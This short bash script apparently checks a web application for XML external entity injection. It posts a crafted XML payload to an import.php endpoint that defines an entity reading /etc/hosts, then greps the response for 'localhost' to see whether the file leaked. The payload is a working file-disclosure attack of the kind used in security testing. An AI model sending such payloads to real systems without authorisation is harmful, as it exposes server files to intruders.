#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
xml='<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><r><item>&xxe;</item></r>'
curl -s -X POST "$TARGET/import.php" -d 'mode=xml' --data-urlencode "xml=$xml" | grep -q 'localhost'
